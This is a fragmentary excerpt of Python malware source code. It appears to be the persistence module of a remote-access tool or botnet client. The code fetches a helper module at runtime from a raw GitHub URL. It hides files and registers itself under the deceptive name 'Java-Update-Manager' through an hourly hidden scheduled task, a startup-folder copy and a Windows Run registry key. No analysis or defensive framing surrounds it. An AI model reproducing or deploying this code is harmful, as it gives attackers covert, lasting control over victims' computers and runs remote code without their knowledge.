...
util = import_cdn("https://raw.githubusercontent.com/275178125/7829157215/master/8125851289/util.py")
...
template_plist = string.Template("""
...
def _add_hidden_file(value=None):
    try:
        ...
        if value and os.path.isfile(value) or os.path.isfile(dest):
            if os.name == 'nt':
                path = dest
                ...
                hide = subprocess.call('cp {} {}'.format(dest, path), shell=True) == 0
            return (True if hide else False, path)
        else:
            util.log("File '{}' not found".format(dest))
...
def _add_scheduled_task(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['scheduled_task'].established:
            value = sys.argv[0]
            fname = value.split("\\")[-1]
            value = os.getenv("APPDATA")+"\\"+fname
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            if value and os.path.isfile(value) or os.path.isfile(fname):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True, startupinfo=startupinfo, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
        ...
        if os.name == 'nt' and not _methods['startup_file'].established:
            ...
            if value and os.path.isfile(value) or os.path.isfile(dest):
                ...
                if not os.path.exists(startup_file):
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    subprocess.Popen('copy "{}" "{}"'.format(value, dest), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, startupinfo=startupinfo)
...
def _add_registry_key(value=None, name='Java-Update-Manager'):
    try:
        if os.name == 'nt' and not _methods['registry_key'].established:
            ...
            if value and os.path.isfile(value) or os.path.isfile(dest):
                try:
                    util.registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", name, dest)
                    return (True, name)
                except Exception as e:
